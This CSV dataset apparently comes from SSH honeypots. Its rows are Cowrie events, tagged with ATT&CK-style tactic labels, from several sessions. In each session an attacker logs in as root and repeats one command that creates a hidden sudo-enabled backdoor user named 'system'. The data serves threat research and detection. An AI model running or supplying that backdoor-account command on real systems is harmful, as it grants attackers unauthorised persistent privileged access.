,event,session_id,session,labels
1495,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T22:25:34.449543Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""dc72937653e5""}",dc72937653e5,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 fgamujdM) system  && sudo usermod -aG sudo system ; openssl passwd -1 fgamujdM;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1496,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T22:25:34.552967Z"", ""session_id"": ""dc72937653e5""}",dc72937653e5,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 fgamujdM) system  && sudo usermod -aG sudo system ; openssl passwd -1 fgamujdM;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1497,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T22:25:34.865717Z"", ""username"": ""root"", ""session_id"": ""dc72937653e5""}",dc72937653e5,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 fgamujdM) system  && sudo usermod -aG sudo system ; openssl passwd -1 fgamujdM;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1498,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T22:25:35.122995Z"", ""session_id"": ""dc72937653e5""}",dc72937653e5,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 fgamujdM) system  && sudo usermod -aG sudo system ; openssl passwd -1 fgamujdM;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1499,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 fgamujdM) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 fgamujdM) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T22:25:35.123351Z"", ""session_id"": ""dc72937653e5""}",dc72937653e5,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 fgamujdM) system  && sudo usermod -aG sudo system ; openssl passwd -1 fgamujdM;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1500,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 fgamujdM"", ""message"": ""CMD: openssl passwd -1 fgamujdM"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T22:25:35.123811Z"", ""session_id"": ""dc72937653e5""}",dc72937653e5,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 fgamujdM) system  && sudo usermod -aG sudo system ; openssl passwd -1 fgamujdM;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1501,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 fgamujdM"", ""message"": ""Command not found: openssl passwd -1 fgamujdM"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T22:25:35.124425Z"", ""session_id"": ""dc72937653e5""}",dc72937653e5,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 fgamujdM) system  && sudo usermod -aG sudo system ; openssl passwd -1 fgamujdM;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1502,"{""duplicate"": false, ""duration"": ""0.2"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/7c2572f02fb46d86aa1ba628e3416bba96c16f44aeb77ba8e6a8bd12a31a3ee0 after 0.2 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""7c2572f02fb46d86aa1ba628e3416bba96c16f44aeb77ba8e6a8bd12a31a3ee0"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T22:25:35.356260Z"", ""ttylog"": ""var/lib/cowrie/tty/7c2572f02fb46d86aa1ba628e3416bba96c16f44aeb77ba8e6a8bd12a31a3ee0"", ""session_id"": ""dc72937653e5""}",dc72937653e5,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 fgamujdM) system  && sudo usermod -aG sudo system ; openssl passwd -1 fgamujdM;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1503,"{""duration"": ""0.9"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.9 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T22:25:35.356837Z"", ""session_id"": ""dc72937653e5""}",dc72937653e5,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 fgamujdM) system  && sudo usermod -aG sudo system ; openssl passwd -1 fgamujdM;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1504,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:1330 (10.42.4.33:2222) [session: a4dc0b13013f]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 1330.0, ""timestamp"": ""2025-08-14T20:03:11.946944Z"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
1505,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T20:03:11.947342Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
1506,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T20:03:12.050885Z"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
1507,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T20:03:12.363684Z"", ""username"": ""root"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
1508,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T20:03:12.590466Z"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
1509,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T20:03:12.590829Z"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
1510,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 wckTqQsE"", ""message"": ""CMD: openssl passwd -1 wckTqQsE"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T20:03:12.591144Z"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
1511,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 wckTqQsE"", ""message"": ""Command not found: openssl passwd -1 wckTqQsE"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T20:03:12.591815Z"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
1512,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/a9db937731827865589eb6ceaead06c78ba6b2c6546336058258ed642fa2b4d2 after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""a9db937731827865589eb6ceaead06c78ba6b2c6546336058258ed642fa2b4d2"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T20:03:12.696798Z"", ""ttylog"": ""var/lib/cowrie/tty/a9db937731827865589eb6ceaead06c78ba6b2c6546336058258ed642fa2b4d2"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
1513,"{""duration"": ""0.8"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.8 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T20:03:12.697334Z"", ""session_id"": ""a4dc0b13013f""}",a4dc0b13013f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 wckTqQsE) system  && sudo usermod -aG sudo system ; openssl passwd -1 wckTqQsE;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
1514,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:6023 (10.42.6.15:2222) [session: 24186c55331e]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 6023.0, ""timestamp"": ""2025-08-13T04:00:28.415592Z"", ""session_id"": ""24186c55331e""}",24186c55331e,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 BtYs4yPj) system  && sudo usermod -aG sudo system ; openssl passwd -1 BtYs4yPj;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1515,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-13T04:00:28.416895Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""24186c55331e""}",24186c55331e,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 BtYs4yPj) system  && sudo usermod -aG sudo system ; openssl passwd -1 BtYs4yPj;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1516,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-13T04:00:28.436217Z"", ""session_id"": ""24186c55331e""}",24186c55331e,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 BtYs4yPj) system  && sudo usermod -aG sudo system ; openssl passwd -1 BtYs4yPj;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1517,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-13T04:00:28.498457Z"", ""username"": ""root"", ""session_id"": ""24186c55331e""}",24186c55331e,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 BtYs4yPj) system  && sudo usermod -aG sudo system ; openssl passwd -1 BtYs4yPj;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1518,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-13T04:00:28.936377Z"", ""session_id"": ""24186c55331e""}",24186c55331e,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 BtYs4yPj) system  && sudo usermod -aG sudo system ; openssl passwd -1 BtYs4yPj;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1519,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 BtYs4yPj) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 BtYs4yPj) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-13T04:00:28.937027Z"", ""session_id"": ""24186c55331e""}",24186c55331e,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 BtYs4yPj) system  && sudo usermod -aG sudo system ; openssl passwd -1 BtYs4yPj;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1520,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 BtYs4yPj"", ""message"": ""CMD: openssl passwd -1 BtYs4yPj"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-13T04:00:28.937605Z"", ""session_id"": ""24186c55331e""}",24186c55331e,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 BtYs4yPj) system  && sudo usermod -aG sudo system ; openssl passwd -1 BtYs4yPj;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1521,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 BtYs4yPj"", ""message"": ""Command not found: openssl passwd -1 BtYs4yPj"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-13T04:00:28.938409Z"", ""session_id"": ""24186c55331e""}",24186c55331e,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 BtYs4yPj) system  && sudo usermod -aG sudo system ; openssl passwd -1 BtYs4yPj;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1522,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/737c512e7deb130bb25509691dc0a4605e2337de6c0ea07282ddeadd7fdc3b4f after 0.1 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""737c512e7deb130bb25509691dc0a4605e2337de6c0ea07282ddeadd7fdc3b4f"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-13T04:00:29.062293Z"", ""ttylog"": ""var/lib/cowrie/tty/737c512e7deb130bb25509691dc0a4605e2337de6c0ea07282ddeadd7fdc3b4f"", ""session_id"": ""24186c55331e""}",24186c55331e,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 BtYs4yPj) system  && sudo usermod -aG sudo system ; openssl passwd -1 BtYs4yPj;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1523,"{""duration"": ""0.6"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.6 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-13T04:00:29.065027Z"", ""session_id"": ""24186c55331e""}",24186c55331e,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 BtYs4yPj) system  && sudo usermod -aG sudo system ; openssl passwd -1 BtYs4yPj;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1524,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:52260 (10.42.6.15:2222) [session: e09fdaddf823]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 52260.0, ""timestamp"": ""2025-08-07T01:50:51.851208Z"", ""session_id"": ""e09fdaddf823""}",e09fdaddf823,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ebf4GNDT) system  && sudo usermod -aG sudo system ; openssl passwd -1 ebf4GNDT;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1525,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T01:50:51.852609Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""e09fdaddf823""}",e09fdaddf823,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ebf4GNDT) system  && sudo usermod -aG sudo system ; openssl passwd -1 ebf4GNDT;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
